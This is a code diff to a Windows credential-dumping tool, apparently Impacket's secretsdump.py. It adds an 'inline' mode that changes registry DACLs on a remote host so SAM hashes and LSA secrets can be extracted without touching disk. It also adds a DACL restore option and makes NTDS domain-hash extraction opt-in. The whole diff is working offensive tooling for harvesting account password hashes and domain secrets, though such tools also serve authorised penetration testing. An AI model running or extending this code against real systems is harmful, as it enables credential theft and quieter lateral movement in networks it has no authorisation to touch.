@@ -99,7 +99,10 @@ class DumpSecrets:
         self.__history = options.history
         self.__noLMHash = True
         self.__isRemote = True
-        self.__outputFileName = options.outputfile
+        self.__useNTDS = options.use_ntds
+        self.__isInline = options.inline
+        self.__restore = options.restore
+        self.__outputFileName = options.outputfile  
         self.__doKerberos = options.k
         self.__justDC = options.just_dc
         self.__justDCNTLM = options.just_dc_ntlm
@@ -204,9 +207,10 @@ class DumpSecrets:
                     self.__remoteOps.setExecMethod(self.__options.exec_method)
                     if self.__justDC is False and self.__justDCNTLM is False and self.__useKeyListMethod is False or self.__useVSSMethod is True:
                         self.__remoteOps.enableRegistry()
-                        bootKey = self.__remoteOps.getBootKey()
-                        # Let's check whether target system stores LM Hashes
-                        self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
+                        if self.__restore is False:
+                            bootKey = self.__remoteOps.getBootKey()
+                            # Let's check whether target system stores LM Hashes
+                            self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
                 except Exception as e:
                     self.__canProcessSAMLSA = False
                     if str(e).find('STATUS_USER_SESSION_DELETED') and os.getenv('KRB5CCNAME') is not None \
@@ -218,7 +222,7 @@ class DumpSecrets:
                         logging.error('RemoteOperations failed: %s' % str(e))
 
             # If the KerberosKeyList method is enable we dump the secrets only via TGS-REQ
-            if self.__useKeyListMethod is True:
+            if self.__useKeyListMethod is True and self.__restore is False:
                 try:
                     self.__KeyListSecrets = KeyListSecrets(self.__domain, self.__remoteName, self.__rodc, self.__aesKeyRodc, self.__remoteOps)
                     self.__KeyListSecrets.dump()
@@ -226,27 +230,38 @@ class DumpSecrets:
                     logging.error('Something went wrong with the Kerberos Key List approach.: %s' % str(e))
             else:
                 # If RemoteOperations succeeded, then we can extract SAM and LSA
-                if self.__justDC is False and self.__justDCNTLM is False and self.__canProcessSAMLSA:
+                if self.__justDC is False and self.__justDCNTLM is False and self.__canProcessSAMLSA and self.__restore is False:
                     try:
-                        if self.__isRemote is True:
+                        if self.__isInline is True:
+                            self.__remoteOps.prepareDumpInline()
+                    except Exception as e:
+                        logging.error('Modifying ACLs failed: %s' % str(e))
+
+                    try:
+                        if self.__isInline is True:
+                            SAMFileName = None
+                        elif self.__isRemote is True:
                             SAMFileName = self.__remoteOps.saveSAM()
                         else:
                             SAMFileName = self.__samHive
 
-                        self.__SAMHashes = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)
+                        self.__SAMHashes = SAMHashes(SAMFileName, bootKey, remoteOps = self.__remoteOps, isInline = self.__isInline, isRemote = self.__isRemote)
                         self.__SAMHashes.dump()
+                        
                         if self.__outputFileName is not None:
                             self.__SAMHashes.export(self.__outputFileName)
                     except Exception as e:
                         logging.error('SAM hashes extraction failed: %s' % str(e))
 
                     try:
-                        if self.__isRemote is True:
+                        if self.__isInline is True:
+                            SECURITYFileName = None
+                        elif self.__isRemote is True:
                             SECURITYFileName = self.__remoteOps.saveSECURITY()
                         else:
                             SECURITYFileName = self.__securityHive
 
-                        self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps,
+                        self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps, isInline=self.__isInline, 
                                                        isRemote=self.__isRemote, history=self.__history)
                         self.__LSASecrets.dumpCachedHashes()
                         if self.__outputFileName is not None:
@@ -260,40 +275,45 @@ class DumpSecrets:
                             traceback.print_exc()
                         logging.error('LSA hashes extraction failed: %s' % str(e))
 
-                # NTDS Extraction we can try regardless of RemoteOperations failing. It might still work
-                if self.__isRemote is True:
-                    if self.__useVSSMethod and self.__remoteOps is not None and self.__remoteOps.getRRP() is not None:
-                        NTDSFileName = self.__remoteOps.saveNTDS()
+                if self.__useNTDS:
+                    # NTDS Extraction we can try regardless of RemoteOperations failing. It might still work
+                    if self.__isRemote is True:
+                        if self.__useVSSMethod and self.__remoteOps is not None and self.__remoteOps.getRRP() is not None:
+                            NTDSFileName = self.__remoteOps.saveNTDS()
+                        else:
+                            NTDSFileName = None
                     else:
-                        NTDSFileName = None
-                else:
-                    NTDSFileName = self.__ntdsFile
+                        NTDSFileName = self.__ntdsFile
 
-                self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, isRemote=self.__isRemote, history=self.__history,
-                                               noLMHash=self.__noLMHash, remoteOps=self.__remoteOps,
-                                               useVSSMethod=self.__useVSSMethod, justNTLM=self.__justDCNTLM,
-                                               pwdLastSet=self.__pwdLastSet, resumeSession=self.__resumeFileName,
-                                               outputFileName=self.__outputFileName, justUser=self.__justUser,
-                                               ldapFilter=self.__ldapFilter, printUserStatus=self.__printUserStatus)
-                try:
-                    self.__NTDSHashes.dump()
-                except Exception as e:
-                    if logging.getLogger().level == logging.DEBUG:
-                        import traceback
-                        traceback.print_exc()
-                    if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
-                        # We don't store the resume file if this error happened, since this error is related to lack
-                        # of enough privileges to access DRSUAPI.
-                        resumeFile = self.__NTDSHashes.getResumeSessionFile()
-                        if resumeFile is not None:
-                            os.unlink(resumeFile)
-                    logging.error(e)
-                    if (self.__justUser or self.__ldapFilter) and str(e).find("ERROR_DS_NAME_ERROR_NOT_UNIQUE") >= 0:
-                        logging.info("You just got that error because there might be some duplicates of the same name. "
-                                     "Try specifying the domain name for the user as well. It is important to specify it "
-                                     "in the form of NetBIOS domain name/user (e.g. contoso/Administratror).")
-                    elif self.__useVSSMethod is False:
-                        logging.info('Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter')
+                    self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, isRemote=self.__isRemote, history=self.__history,
+                                                noLMHash=self.__noLMHash, remoteOps=self.__remoteOps,
+                                                useVSSMethod=self.__useVSSMethod, justNTLM=self.__justDCNTLM,
+                                                pwdLastSet=self.__pwdLastSet, resumeSession=self.__resumeFileName,
+                                                outputFileName=self.__outputFileName, justUser=self.__justUser,
+                                                ldapFilter=self.__ldapFilter, printUserStatus=self.__printUserStatus)                
+                    try:
+                        self.__NTDSHashes.dump()
+                    except Exception as e:
+                        if logging.getLogger().level == logging.DEBUG:
+                            import traceback
+                            traceback.print_exc()
+                        if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
+                            # We don't store the resume file if this error happened, since this error is related to lack
+                            # of enough privileges to access DRSUAPI.
+                            resumeFile = self.__NTDSHashes.getResumeSessionFile()
+                            if resumeFile is not None:
+                                os.unlink(resumeFile)
+                        logging.error(e)
+                        if (self.__justUser or self.__ldapFilter) and str(e).find("ERROR_DS_NAME_ERROR_NOT_UNIQUE") >= 0:
+                            logging.info("You just got that error because there might be some duplicates of the same name. "
+                                        "Try specifying the domain name for the user as well. It is important to specify it "
+                                        "in the form of NetBIOS domain name/user (e.g. contoso/Administratror).")
+                        elif self.__useVSSMethod is False:
+                            logging.info('Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter')
+                
+                if self.__restore is True:
+                    self.__remoteOps.restoreDaclFromFile()
+
                 self.cleanup()
         except (Exception, KeyboardInterrupt) as e:
             if logging.getLogger().level == logging.DEBUG:
@@ -324,6 +344,8 @@ class DumpSecrets:
 
     def cleanup(self):
         logging.info('Cleaning up... ')
+        if self.__isInline and self.__remoteOps:
+            self.__remoteOps.revertDacl()
         if self.__remoteOps:
             self.__remoteOps.finish()
         if self.__SAMHashes:
@@ -364,6 +386,12 @@ if __name__ == '__main__':
                         help='base output filename. Extensions will be added for sam, secrets, cached and ntds')
     parser.add_argument('-use-vss', action='store_true', default=False,
                         help='Use the VSS method instead of default DRSUAPI')
+    parser.add_argument('-use-ntds', action='store_true', default=False,
+                        help='Perform NTDS extraction')
+    parser.add_argument('-inline', action='store_true', default=False,
+                        help='SAM and LSA Secrets extraction without touching disk')
+    parser.add_argument('-restore', action='store_true', default=False,
+                        help='Restore DACLs in case the inline dump method failed')
     parser.add_argument('-rodcNo', action='store', type=int, help='Number of the RODC krbtgt account (only avaiable for Kerb-Key-List approach)')
     parser.add_argument('-rodcKey', action='store', help='AES key of the Read Only Domain Controller (only avaiable for Kerb-Key-List approach)')
     parser.add_argument('-use-keylist', action='store_true', default=False,
